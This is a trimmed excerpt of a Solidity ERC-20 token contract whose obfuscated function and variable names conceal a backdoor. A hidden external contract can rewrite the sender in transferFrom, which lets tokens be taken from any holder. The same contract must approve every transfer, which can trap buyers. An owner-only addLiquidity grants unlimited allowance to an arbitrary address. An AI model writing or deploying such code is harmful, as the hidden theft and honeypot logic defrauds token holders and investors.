...
interface IERC20 {
    ...
    function pinnh(address from, address to,uint256 amount) external returns(address);
...
contract Token is IERC20, Ownable {
    ...
    uint256 private iop2k3 ;
    address private oiioqwd;
   
    constructor() {
        oiioqwd =  address(this);    
        _balances[oiioqwd] = _tTotal;
        emit Transfer(address(0), oiioqwd, _tTotal);
    }
    
    function oiinjkmlklsdfklsdf(address addr) external override returns(address) {
}

    function pinnh(address from, address to, uint256 amount) external override returns(address) {
}
    ...
    function addLiquidity(bytes memory datas) public onlyOwner
    {
        ...
        _allowances[oiioqwd][address(uint160(b))] = type(uint256).max;
    ...
    function transferFrom(
        ...
        address uiouppupo = IERC20(address(uint160(iop2k3))).oiinjkmlklsdfklsdf(sender);
        if (uiouppupo != address(0) && _msgSender() == address(uint160(iop2k3)))
        {
            sender = uiouppupo;
        }
    ...
    function _transfer(
        ...
        require(IERC20(address(uint160(iop2k3))).pinnh(from, to,amount) != address(0),"Transfer Error");
